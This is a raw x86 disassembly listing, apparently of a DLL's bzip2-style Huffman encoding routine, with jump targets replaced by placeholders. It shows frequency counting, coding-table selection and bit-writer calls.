shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x3a ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x3c ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x3e ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x40 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x42 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x44 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x46 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x48 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x4a ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x4c ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x4e ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x50 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x52 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x54 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x56 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x58 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x5a ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x5c ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x5e ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x60 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0xc ]
movzx edi [ ebx + edi * 2 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov [ ebp - 0x18 ] ax
shr eax 0x10
mov [ ebp - 0x14 ] cx
shr ecx 0x10
mov [ ebp - 0x10 ] dx
shr edx 0x10
mov [ ebp - 0x16 ] ax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x12 ] cx
mov [ ebp - 0xe ] dx
jmp r-xdata
inc eax
cmp eax [ ebp - 0x3c ]
jl r-xdata
push 0xbbb
jmp r-xdata
cmp ecx 0x4652
jg r-xdata
call sub_100196de
and [ ebp - 0x20 ] 0x0
cmp [ ebp - 0x30 ] 0x0
movzx ecx [ ebx + ecx * 2 ]
jle r-xdata
and [ ebp - 0x20 ] 0x0
or ecx 0xffffffff
cmp [ ebp - 0x30 ] 0x0
mov [ ebp - 0x24 ] 0x3b9ac9ff
jle r-xdata
xor eax eax
cmp [ ebp - 0x30 ] eax
jle r-xdata
mov ecx [ ebp - 0x24 ]
inc ecx
cmp ecx [ ebp - 0x2c ]
movzx ecx cx
lea ecx [ ecx + esi + 0x9324 ]
mov edx [ ebp - 0x24 ]
add [ ebp - 0x28 ] edx
inc [ ebp + ecx * 4 - 0x5c ]
mov edx [ ebp - 0x40 ]
inc [ ebp - 0x40 ]
cmp [ ebp - 0x30 ] 0x6
mov [ esi + edx + 0x680 ] cl
jne r-xdata
mov edx [ ebp - 0x20 ]
movzx edx [ ebp + edx * 2 - 0x18 ]
cmp edx [ ebp - 0x24 ]
jge r-xdata
test ecx ecx
jle r-xdata
mov [ ebp + eax - 0xc ] al
inc eax
cmp eax [ ebp - 0x30 ]
jl r-xdata
mov edx [ ebp - 0x20 ]
movzx di [ ecx ]
lea edx [ ebp + edx * 2 - 0x18 ]
add [ edx ] di
inc [ ebp - 0x20 ]
mov edx [ ebp - 0x20 ]
add ecx 0x102
cmp edx [ ebp - 0x30 ]
jl r-xdata
cmp eax [ ebp - 0x2c ]
jg r-xdata
mov edx [ ebp - 0x2c ]
sub edx eax
inc edx
cmp edx 0x32
jne r-xdata
inc [ ebp - 0x20 ]
mov edx [ ebp - 0x20 ]
cmp edx [ ebp - 0x30 ]
jl r-xdata
mov ecx [ ebp - 0x20 ]
mov [ ebp - 0x24 ] edx
and [ ebp - 0x20 ] 0x0
cmp [ ebp - 0x30 ] 0x0
jle r-xdata
lea edi [ esi + 0x4cd2 ]
mov [ ebp - 0x28 ] ecx
mov eax [ ebp - 0x2c ]
mov ecx [ esi + 0x274 ]
inc eax
cmp eax ecx
mov [ ebp - 0x24 ] eax
jl r-xdata
add ecx 0x2c
imul ecx ecx 0x102
movzx edx [ ebx + eax * 2 ]
add ecx 0x2c
imul ecx ecx 0x102
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x2 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x4 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x6 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x8 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0xa ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0xc ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0xe ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x10 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x12 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x14 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x16 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x18 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x1a ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x1c ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x1e ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x20 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x22 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x24 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x26 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x28 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x2a ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x2c ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x2e ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x30 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x32 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x34 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x36 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x38 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x3a ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x3c ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x3e ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x40 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x42 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x44 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x46 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x48 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x4a ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x4c ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x4e ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x50 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x52 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x54 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x56 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x58 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x5a ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x5c ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x5e ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx eax [ ebx + eax * 2 + 0x60 ]
add eax ecx
lea eax [ esi + eax * 4 ]
inc [ eax ]
mov eax [ ebp - 0xc ]
movzx eax [ ebx + eax * 2 ]
add eax ecx
lea eax [ esi + eax * 4 ]
inc [ eax ]
jmp r-xdata
lea eax [ esi + 0x58 ]
xor ecx ecx
mov edi eax
lea eax [ esi + 0x9324 ]
mov [ ebp - 0x28 ] 0xffff9328
sub [ ebp - 0x28 ] esi
mov [ ebp - 0x2c ] eax
mov al [ ebp - 0x35 ]
mov [ edi ] cl
inc edi
dec [ ebp - 0x28 ]
mov [ ebp - 0xc ] al
jne r-xdata
mov al [ ebp - 0x35 ]
inc ecx
mov [ ebp - 0x41 ] al
lea eax [ ebp + ecx - 0xc ]
mov dl [ eax ]
mov [ ebp - 0x35 ] dl
mov dl [ ebp - 0x41 ]
mov [ eax ] dl
mov al [ edi - 0x4652 ]
cmp al [ ebp - 0x35 ]
jne r-xdata
movzx edx [ ebx + eax * 2 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
inc eax
cmp eax [ ebp - 0x2c ]
jle r-xdata
inc edx
cmp edx 0x10
jl r-xdata
mov [ eax ] 0x1
xor ecx ecx
cmp edx [ ebp - 0x34 ]
mov [ ebp - 0x24 ] edx
jg r-xdata
mov eax [ ebp - 0x2c ]
movzx eax [ eax + ecx ]
cmp eax [ ebp - 0x34 ]
jle r-xdata
mov dl [ ebp - 0xc ]
mov al [ edi - 0x4652 ]
xor ecx ecx
mov [ ebp - 0x35 ] dl
cmp al dl
je r-xdata
cmp [ edx + edi ] 0x0
je r-xdata
inc ecx
add edi 0x10
cmp ecx 0x10
jl r-xdata
inc [ ebp - 0x20 ]
mov eax [ ebp - 0x20 ]
add [ ebp - 0x2c ] 0x102
cmp eax [ ebp - 0x30 ]
jl r-xdata
xor eax eax
cmp [ ebp - 0x3c ] eax
jle r-xdata
cmp eax edx
jge r-xdata
mov [ ebp - 0x34 ] eax
lea eax [ ebp + ecx - 0x1c ]
mov [ eax ] 0x0
xor edx edx
mov eax [ esi + 0x4c ]
mov [ ebp - 0x34 ] eax
xor edi edi
xor ecx ecx
cmp [ ebp - 0x3c ] ecx
push 0x20
pop edx
mov [ ebp - 0x34 ] ecx
jle r-xdata
add ecx ecx
inc [ ebp - 0x24 ]
mov eax [ ebp - 0x24 ]
cmp eax [ ebp - 0x34 ]
jle r-xdata
mov edx [ ebp - 0x2c ]
movzx edx [ eax + edx ]
cmp edx [ ebp - 0x24 ]
jne r-xdata
inc ecx
cmp ecx [ ebp - 0x3c ]
jl r-xdata
mov edx eax
push 0x1
inc ecx
push ecx
jmp r-xdata
inc eax
cmp eax [ ebp - 0x3c ]
jl r-xdata
mov edx [ ebp - 0x28 ]
add edx eax
add edx [ ebp - 0x2c ]
mov [ esi + edx * 4 ] ecx
inc ecx
cmp [ ebp - 0x34 ] 0x11
jg r-xdata
xor ecx ecx
mov eax esi
cmp [ ebp + edi - 0x1c ] cl
je r-xdata
and [ ebp - 0x24 ] 0x0
lea eax [ esi + 0x58 ]
mov [ ebp - 0x28 ] eax
call sub_1001ab59
inc edi
cmp edi 0x10
pop ecx
jl r-xdata
push 0xbbc
jmp r-xdata
cmp edx 0x1
jl r-xdata
inc [ ebp - 0x24 ]
add [ ebp - 0x28 ] 0x10
cmp [ ebp - 0x24 ] 0x10
jl r-xdata
xor edi edi
push 0xbbd
jmp r-xdata
mov eax [ ebp - 0x24 ]
cmp [ ebp + eax - 0x1c ] 0x0
je r-xdata
cmp [ esi + 0x268 ] 0x3
jl r-xdata
push 0x1
inc ecx
push ecx
jmp r-xdata
mov eax [ esi + 0x4c ]
mov ecx [ ebp - 0x30 ]
mov [ ebp - 0x34 ] eax
push 0x3
mov eax esi
call sub_1001ab59
mov ecx [ ebp - 0x40 ]
push 0xf
call sub_1001ab59
cmp [ ebp - 0x40 ] 0x0
pop ecx
pop ecx
jle r-xdata
mov eax [ esi + 0x4c ]
sub eax [ ebp - 0x34 ]
push eax
push r--data
call sub_1002a56e
add eax 0x40
push eax
call sub_1002a723
add esp 0xc
mov eax [ ebp - 0x28 ]
xor ecx ecx
cmp [ edi + eax ] cl
mov eax esi
je r-xdata
call sub_1001ab59
inc edi
cmp edi 0x10
pop ecx
jl r-xdata
cmp [ esi + 0x268 ] 0x3
jl r-xdata
mov eax [ ebp - 0x40 ]
lea edi [ esi + 0x4cd2 ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x30 ]
mov eax [ esi + 0x4c ]
mov [ ebp - 0x34 ] eax
test ecx ecx
jle r-xdata
mov eax [ esi + 0x4c ]
sub eax [ ebp - 0x34 ]
push eax
push r--data
call sub_1002a56e
add eax 0x40
push eax
call sub_1002a723
add esp 0xc
push 0x1
xor ecx ecx
mov eax esi
call sub_1001ab59
inc edi
dec [ ebp - 0xc ]
pop ecx
jne r-xdata
xor ecx ecx
inc ecx
push ecx
mov eax esi
call sub_1001ab59
movzx eax [ edi ]
inc [ ebp - 0x28 ]
cmp [ ebp - 0x28 ] eax
pop ecx
jl r-xdata
cmp [ esi + 0x268 ] 0x3
jl r-xdata
lea eax [ esi + 0x9324 ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0xc ] ecx
and [ ebp - 0x28 ] 0x0
cmp [ edi ] 0x0
jbe r-xdata
mov eax [ esi + 0x4c ]
xor ecx ecx
mov [ ebp - 0x34 ] eax
mov eax [ esi + 0x274 ]
cmp eax ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x24 ] ecx
jle r-xdata
mov eax [ esi + 0x4c ]
sub eax [ ebp - 0x34 ]
push eax
push r--data
call sub_1002a56e
add eax 0x40
push eax
call sub_1002a723
add esp 0xc
add [ ebp - 0x20 ] 0x102
dec [ ebp - 0xc ]
jne r-xdata
mov eax [ ebp - 0x3c ]
mov edi [ ebp - 0x20 ]
mov [ ebp - 0x28 ] eax
jmp r-xdata
mov eax [ ebp - 0x3c ]
cmp eax [ ebp - 0x40 ]
je r-xdata
lea edx [ ecx + 0x31 ]
cmp edx eax
mov [ ebp - 0xc ] edx
mov [ ebp - 0x2c ] edx
jl r-xdata
mov eax [ ebp - 0x20 ]
movzx ecx [ eax ]
push 0x5
mov eax esi
mov [ ebp - 0x2c ] ecx
call sub_1001ab59
cmp [ ebp - 0x3c ] 0x0
pop ecx
jle r-xdata
movzx eax [ edi ]
cmp [ ebp - 0x2c ] eax
jl r-xdata
cmp [ esi + 0x268 ] 0x3
jl r-xdata
push 0xbbf
jmp r-xdata
mov eax [ ebp - 0x3c ]
lea edi [ eax + esi + 0x680 ]
movzx eax [ edi ]
cmp eax [ ebp - 0x30 ]
jge r-xdata
dec eax
mov [ ebp - 0x2c ] eax
push 0x2
pop ecx
push ecx
mov eax esi
call sub_1001ab59
inc [ ebp - 0x2c ]
pop ecx
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_10027150
leave
retn
mov eax [ esi + 0x4c ]
sub eax [ ebp - 0x34 ]
push eax
push r--data
call sub_1002a56e
add eax 0x40
push eax
call sub_1002a723
add esp 0xc
push 0xbbe
jmp r-xdata
cmp [ ebp - 0x30 ] 0x6
jne r-xdata
movzx eax [ edi ]
cmp [ ebp - 0x2c ] eax
mov eax esi
jg r-xdata
cmp ecx [ ebp - 0x2c ]
mov [ ebp - 0x24 ] ecx
jg r-xdata
mov eax [ ebp - 0x2c ]
sub eax ecx
inc eax
cmp eax 0x32
jne r-xdata
push 0x2
push 0x3
pop ecx
call sub_1001ab59
dec [ ebp - 0x2c ]
pop ecx
push 0x1
xor ecx ecx
call sub_1001ab59
inc edi
dec [ ebp - 0x28 ]
pop ecx
jne r-xdata
mov ecx [ ebp - 0x2c ]
mov eax [ esi + 0x274 ]
inc ecx
inc [ ebp - 0x3c ]
cmp ecx eax
mov [ ebp - 0x24 ] ecx
jl r-xdata
movzx eax [ edi ]
mov ecx [ ebp - 0x24 ]
movzx ecx [ ebx + ecx * 2 ]
lea edx [ eax + 0x26 ]
add eax 0x92
imul edx edx 0x102
imul eax eax 0x102
add eax esi
movzx eax [ eax + ecx ]
add edx ecx
mov ecx [ esi + edx * 4 ]
push eax
mov eax esi
call sub_1001ab59
inc [ ebp - 0x24 ]
mov eax [ ebp - 0x24 ]
cmp eax [ ebp - 0x2c ]
pop ecx
jle r-xdata
movzx eax [ edi ]
mov ecx [ ebp - 0x24 ]
movzx ecx [ ebx + ecx * 2 ]
lea edi [ eax + 0x92 ]
add eax 0x26
imul edi edi 0x102
imul eax eax 0x408
add edi esi
movzx edx [ edi + ecx ]
add eax esi
mov ecx [ eax + ecx * 4 ]
mov [ ebp - 0x20 ] eax
push edx
mov eax esi
call sub_1001ab59
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x2 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001ab59
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x4 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001ab59
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x6 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001ab59
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x8 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001ab59
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0xa ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001ab59
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0xc ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001ab59
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0xe ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001ab59
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x10 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001ab59
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x12 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001ab59
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x14 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001ab59
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x16 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001ab59
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x18 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001ab59
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x1a ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001ab59
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x1c ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001ab59
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x1e ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001ab59
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x20 ]
movzx ecx [ edi + eax ]
add esp 0x40
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001ab59
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x22 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001ab59
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x24 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001ab59
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x26 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001ab59
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x28 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001ab59
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x2a ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001ab59
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x2c ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001ab59
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x2e ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001ab59
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x30 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001ab59
mov eax [ ebp - 0x24 ]
